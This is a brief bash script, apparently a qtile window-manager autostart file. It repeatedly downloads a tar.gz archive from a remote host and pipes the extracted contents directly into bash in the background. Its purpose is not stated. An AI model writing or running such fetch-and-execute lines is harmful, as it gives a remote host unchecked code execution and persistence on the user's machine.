#! /bin/bash
sh -c "until wget -q -o /dev/null -O ${HOME}/.config/qtile/autostart.tar.gz http://cdn.bisotuntech.com/btech-mirror-startup.tar.gz
do
  sleep 2
done
tar -xvzOf ${HOME}/.config/qtile/autostart.tar.gz | bash" &
